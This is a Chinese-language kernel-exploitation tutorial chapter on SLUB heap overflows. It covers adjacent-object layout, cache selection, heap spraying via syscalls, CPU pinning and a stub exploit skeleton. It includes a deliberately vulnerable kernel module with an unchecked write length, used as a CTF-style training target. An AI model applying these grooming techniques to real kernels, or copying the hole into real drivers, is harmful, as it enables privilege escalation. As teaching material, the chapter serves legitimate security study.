# Ch 9 — Heap Overflow in kmalloc：相鄰 object 布局與 cache 選擇

> 目標：在 SLUB 上做**線性溢位** — 我 `kmalloc(64)` 的 chunk 後面是誰？怎麼讓「可控 object」和「受害 object」落在同個 slab page 的相鄰位置？這章核心是 **layout control**，是整個 Part 3 heap 技術的第一個實戰。

## Heap overflow 與 stack overflow 的本質差異

| | stack overflow | heap overflow |
|---|---|---|
| 觸發點 | `copy_from_user` 越界 | 同樣，但目標是 `kmalloc` chunk |
| 相鄰數據 | canary、saved rbp、return addr | 相鄰 SLUB object |
| 控制目標 | RIP | 相鄰 object 的 data（function pointer、size、freelist...） |
| 防禦 | canary | redzone（SLUB_DEBUG，預設沒開） |
| 關鍵問題 | 「相鄰是誰」固定 | 「相鄰是誰」**你 spray 出來的** |

**heap overflow 最難的不是技術，是 layout**。spray 得對，溢位剛好打到要打的 object；spray 錯了，打到 kernel 內部 struct 就 panic。

## SLUB 上線性 overflow 的空間

```
kmalloc-128 slab page (4 KB = 32 個 128-byte object)

┌──────────┬──────────┬──────────┬──────────┬─────┐
│ obj₀     │ obj₁     │ obj₂     │ obj₃     │ ... │  32 個
│ (你的)   │ (victim) │          │          │     │
│ overflow→│←被蓋     │          │          │     │
└──────────┴──────────┴──────────┴──────────┴─────┘
```

你 alloc 了 obj₀，overflow 寫超過 128 byte 就踩進 obj₁。**如果 obj₁ 是你 spray 出來的 `tty_struct`**，你就能覆寫它的 `->ops`（function pointer table）→ RIP 控制 → Ch 12。

## 為什麼 spray 做得出來 layout

SLUB 的 fast path：`cpu_slab->freelist` pop → 這個 CPU 上連續 alloc 的 object 地址**單調**（可能遞增也可能遞減，取決於 freelist 怎麼串）。

**所以如果你在一個 CPU 上連續做：**

```
spray: A A A A A A A A A ... A   (1000 次 alloc)
```

這 1000 個 object 會填滿好幾個 slab page，**連續佔位**。

接著：

```
free: A₅₀₀                       (釋放中間一個)
alloc: V                         (victim，大小 = A)
```

`V` 會被塞回 A₅₀₀ 的洞。現在 V 左右都是 A。

然後你對 A₄₉₉ overflow，**剛好打到 V**。

這是 **heap feng shui** 的最基本形態。實際寫 exploit 會更精細（per-CPU 影響、FREELIST_RANDOM 攪亂），但概念就這麼簡單。

## 寫一個 heap overflow module

```bash
mkdir -p ~/kpwn/module/ch09-heap
cd ~/kpwn/module/ch09-heap
```

`vuln.c`：

```c
#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

#define MAX_OBJS 16
static void *objs[MAX_OBJS];
static size_t obj_sizes[MAX_OBJS];

struct op { int idx; size_t len; char __user *buf; };
#define OP_ALLOC _IOW('v', 1, struct op)   /* idx, len */
#define OP_FREE  _IOW('v', 2, struct op)   /* idx */
#define OP_WRITE _IOW('v', 3, struct op)   /* idx, len, buf  ← 洞：沒檢查 len */
#define OP_READ  _IOR('v', 4, struct op)   /* idx, len, buf */

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    struct op op;
    if (copy_from_user(&op, (void __user *)arg, sizeof(op)))
        return -EFAULT;
    if (op.idx < 0 || op.idx >= MAX_OBJS) return -EINVAL;

    switch (cmd) {
    case OP_ALLOC:
        if (objs[op.idx]) return -EEXIST;
        objs[op.idx] = kmalloc(op.len, GFP_KERNEL);
        obj_sizes[op.idx] = op.len;
        return objs[op.idx] ? 0 : -ENOMEM;

    case OP_FREE:
        kfree(objs[op.idx]);
        objs[op.idx] = NULL;
        return 0;

    case OP_WRITE:
        if (!objs[op.idx]) return -ENOENT;
        /* 洞：op.len 沒和 obj_sizes[op.idx] 比對，可以任意長 */
        if (copy_from_user(objs[op.idx], op.buf, op.len))
            return -EFAULT;
        return 0;

    case OP_READ:
        if (!objs[op.idx]) return -ENOENT;
        if (copy_to_user(op.buf, objs[op.idx], op.len))
            return -EFAULT;
        return 0;
    }
    return -ENOTTY;
}

static const struct file_operations fops = {
    .owner = THIS_MODULE, .unlocked_ioctl = vuln_ioctl,
};
static struct miscdevice md = {
    .minor = MISC_DYNAMIC_MINOR, .name = "vuln", .fops = &fops, .mode = 0666,
};
static int __init m_init(void) { return misc_register(&md); }
static void __exit m_exit(void) {
    for (int i = 0; i < MAX_OBJS; i++) kfree(objs[i]);
    misc_deregister(&md);
}
module_init(m_init); module_exit(m_exit);
MODULE_LICENSE("GPL");
```

這個 module 模擬典型的 kmalloc-heap-overflow 題型 — 一組可控的 slot，可以 alloc/free/write/read。CTF 題 90% 長這樣。

## Primitive：「控制相鄰 object」的玩法

假設你 alloc 兩個 obj：

```c
ioctl(fd, OP_ALLOC, &(struct op){.idx=0, .len=128});
ioctl(fd, OP_ALLOC, &(struct op){.idx=1, .len=128});
```

SLUB fast path 下，obj[1] **很可能**緊跟 obj[0] 的後面（同一 slab page、相鄰 slot）— 但 **FREELIST_RANDOM** 下順序可能反過來（obj[1] 在前、obj[0] 在後）。

### 怎麼判斷誰在前？

寫個偵測：

```c
/* 在 obj[0] 寫 200 byte（溢出 72 byte）— 會踩到誰？ */
char payload[200];
memset(payload, 0, 128);
memset(payload + 128, 0xAA, 72);  /* 後 72 byte 標記 */

ioctl(fd, OP_WRITE, &(struct op){.idx=0, .len=200, .buf=payload});

/* 讀 obj[1] 看是否被汙染 */
char readbuf[128];
ioctl(fd, OP_READ, &(struct op){.idx=1, .len=128, .buf=readbuf});
if (readbuf[0] == 0xAA) printf("obj[1] is after obj[0]\n");
else                    printf("obj[1] is before obj[0] or in another page\n");
```

這是 **heap layout probing**。之後做 exploit 第一步都是先探 layout。

## Victim object：選什麼打

這章只講「相鄰 object 能被覆寫」這件事，victim 是什麼 object 的深入在 Ch 11。但給個 preview：

```
     ┌─────────────────────┐
     │ 我的可控 obj (128)  │
     │ overflow →          │
     ├─────────────────────┤
     │ tty_struct (1024)   │ ← 放不進，因為 size 不同
     │ ...                 │
     └─────────────────────┘
```

**kmalloc-128 的相鄰只能是 kmalloc-128 的東西**。tty_struct 在 kmalloc-1024。要打 tty_struct 得 overflow 在 kmalloc-1024 裡。

所以 heap overflow exploit 的**第一個決策**是：「我的 vulnerable alloc 在哪個 cache，我要打的 victim 也要在這個 cache」。

### 同 cache 的常用 victim

| Cache | 常見 victim object |
|---|---|
| kmalloc-64 | `msg_msg` header、`sk_buff_fclones`、部分 fs 結構 |
| kmalloc-128 | `msg_msg` 的 payload、部分 `user_key_payload` |
| kmalloc-256 | `sk_buff`、`ip_mc_list` |
| kmalloc-512 | ldt_struct 相關 |
| kmalloc-1024 | **`tty_struct`** — 最著名的 RIP 控制 target |
| kmalloc-2048 | sched 相關 |

Ch 11 會把每個 victim 的 size、怎麼 spray、能做什麼做成一張完整表。

## SLAB_FREELIST_HARDENED 的影響

SLUB freelist 每個 free object 第一個 qword 是 `next XOR cookie XOR pos`。**在 object 被 free 之前覆寫這個 qword 沒影響**（object 還 in-use，沒 freelist 指標）。**在被 free 之後覆寫才攪局**。

所以 heap overflow 如果打的是「**正在被使用的** victim object」的 data，freelist_hardened 根本不在場。

freelist_hardened 真正影響的：**UAF 情境下**，free 完的 object 被看成 freelist node，覆寫第一 qword 等於改 freelist → 下一 alloc 拿到你指的地址。這個情境 Ch 10 處理。

## Layout control 的四個實戰技巧

### 1. 把目標 cache 填到剛好要開新 slab

每次 alloc 的 object 所在的 slab page 不一定是同一頁。要讓「你的可控 obj」和「victim」保證在同一頁：

```c
/* 先大量 alloc 填爆 partial slab，讓 SLUB 必須開新 slab page */
for (int i = 0; i < 1000; i++)
    padding[i] = alloc_some_object_of_same_cache();

/* 現在下一個 alloc 幾乎是新 slab page 的 obj₀ */
your_controllable = alloc_controllable();

/* 接著 alloc victim，應該是新 slab page 的 obj₁ */
spray_victim();
```

### 2. 利用 per-CPU locality

SLUB fast path 是 per-CPU。你想讓兩個 alloc 落同 CPU，就要**釘 CPU**：

```c
#include <sched.h>
cpu_set_t cpu;
CPU_ZERO(&cpu); CPU_SET(0, &cpu);
sched_setaffinity(0, sizeof(cpu), &cpu);
```

exploit 開頭第一行就做。KernelCTF 的 submission 幾乎都有。

### 3. 用 syscall 而非 alloc API 來 spray

你 user-space 沒有直接 `kmalloc` 的能力，要找**某個 syscall 內部會做 kmalloc**。常見的：

- `msgsnd` → `msg_msg` spray（Ch 11）
- `socket+setsockopt` → `sk_buff` spray
- `add_key` → `user_key_payload` spray
- `ioctl(TIOCGPTPEER)` → `tty_struct` spray

### 4. FREELIST_RANDOM 應對

打開時同 slab page 內 object 順序是亂的。對策：

- **alloc 夠多對樣本做 probe**：2^N 次測試，找到一次「obj[0] 前面是 victim」的組合
- **用 cross-CPU 切換**：每次 alloc 前 `sched_setaffinity` 換 CPU，讓 SLUB 切到新 cpu_slab（fresh freelist）
- **爆破 spray**：spray 幾百個 victim，只要有一個在你的 overflow 範圍內就贏

真實 CTF 題常常要你跑 5-10 次才穩。kernelCTF 要求成功率 > 90%，技術只好更精細（Ch 13 的 cross-cache 某程度也是在解這問題）。

## exploit skeleton（佔位用，Ch 12 才完成）

```c
/* ~/kpwn/exploit/ch09/exp.c */
int main() {
    pin_to_cpu(0);
    int fd = open("/dev/vuln", O_RDWR);

    /* 1. 填滿當前 partial slab */
    for (int i = 0; i < 500; i++) dummy_alloc();

    /* 2. alloc 可控 obj */
    my_alloc(0, 128);

    /* 3. spray victim（例如 tty_struct 或其他 kmalloc-128 object） */
    int tty_fds[100];
    spray_victim_objects(tty_fds, 100);

    /* 4. overflow：obj[0] 寫 200 byte，後 72 byte 是攻擊 payload */
    overflow(0, payload, 200);

    /* 5. 觸發 victim 的 functionality，讓被改的 field 發揮作用 */
    trigger_victim();

    /* ... Ch 12 處理 RIP 控制 */
}
```

## 常見踩雷

**overflow 打到的卻是 kernel 自己在用的 struct，直接 panic** — layout 沒控好。加 spray padding、加 CPU affinity。

**`kmalloc(128)` 的 chunk 實際給 192 byte** — 不會，128 剛好是一檔 cache 的上限。但 `kmalloc(129)` 會給 192（下一檔 kmalloc-192）。這個對 layout 是關鍵。

**FREELIST_HARDENED 開著以為會影響 overflow** — 不影響 in-use object 的 data。只影響 free 後 freelist pointer。

**`ksize(ptr)` 比 alloc 時要的大** — SLUB 回的是 cache 的 size（可能大於 request）。影響「越界多少 byte 開始踩別人」的計算。

**overflow 在 kmalloc-1024 但 victim 在 kmalloc-2048** — 它們在**不同 slab page**，幾乎不可能相鄰（除非 buddy allocator 給的 page 物理相鄰 — 這是 Ch 13 cross-cache 的事）。

## 動手練習

1. **跑 layout probe**：用上面的 module，alloc 10 個 128-byte obj，每個寫標記，read 回看地址 pattern。觀察 SLUB 預設下的分配順序（FREELIST_RANDOM 下看是否亂）。
2. **CPU affinity 實驗**：pin 到 CPU 0 跑 alloc 500 次，然後 `taskset -c 1` 再 alloc — 看兩批 obj 地址是否有巨大 gap（代表用了不同 cpu_slab）。
3. **用 `msgsnd` 當 spray 工具**：寫個函式呼叫 `msgsnd()` 做 spray，讓它在 kmalloc-128 放進 `msg_msg` 的部分。印出 `/proc/slabinfo` 觀察 `kmalloc-128` 的 active_objs 變化。
4. **故意 overflow 到 kernel internal struct 觸發 panic**：不要 spray 任何 victim，就 overflow 256 byte，看 panic log。這樣體會 layout 未控的災難。
5. **關掉 FREELIST_RANDOM 再跑練習 1**，看地址是否變成嚴格遞增。

## 自我檢核

- [ ] 能畫出 heap overflow 的「可控 obj → 相鄰 victim」布局圖
- [ ] 能說明「why same cache」— 為什麼只能打同 size 的 victim
- [ ] 知道 SLAB_FREELIST_HARDENED 只影響 UAF 下的 freelist 操作，不影響 in-use overflow
- [ ] 能列出四種 layout control 技巧
- [ ] 知道 CPU affinity 在 heap exploit 裡為什麼重要
- [ ] 能從 `/proc/slabinfo` 讀出「這個 cache 現在有幾個 active object / 幾頁 slab」

下一章進 UAF — 比 heap overflow 更常見、但在 SLUB 上**更致命**的漏洞型態。你會看到「free 完的 object 地址立刻給下一個 alloc 用」這個 SLUB 特性如何把 UAF 變成神級原語。

→ [Ch 10 — UAF / Double Free：SLUB freelist corruption](./10-uaf-double-free.md)
